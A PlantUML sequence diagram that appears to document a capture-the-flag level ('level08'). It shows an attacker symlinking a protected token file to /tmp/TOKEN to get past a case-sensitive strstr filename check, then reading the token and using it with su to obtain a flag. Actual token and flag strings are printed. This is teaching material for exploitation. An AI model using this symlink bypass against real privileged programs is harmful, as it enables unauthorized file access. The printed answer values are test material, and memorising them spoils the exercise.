@startuml level08_exploit
title Level08 - Case-Sensitive Blacklist Bypass via Symlink

actor Attacker
participant "/tmp" as Tmp
participant "level08 Binary" as Binary
participant "strstr Check" as Check
participant "/home/user/level08/token" as Token
participant "flag08" as Flag08

Attacker -> Tmp: ln -sf /home/user/level08/token /tmp/TOKEN
Tmp --> Attacker: Symlink created

Attacker -> Binary: ./level08 /tmp/TOKEN

Binary -> Check: if (strstr("/tmp/TOKEN", "token") != NULL)
note right of Check
  Case-sensitive check
  Looking for lowercase "token"
  "/tmp/TOKEN" has uppercase
  Check fails - passes through
end note

Check --> Binary: No match found, proceed

Binary -> Token: Open /tmp/TOKEN via symlink
Token --> Binary: File content: quif5eloekouj29ke0vouxean
Binary --> Attacker: quif5eloekouj29ke0vouxean

Attacker -> Flag08: su flag08 (password)
Flag08 -> Flag08: getflag
Flag08 --> Attacker: 25749xKZ8L7DkSCwJkT9dyv6f

@enduml
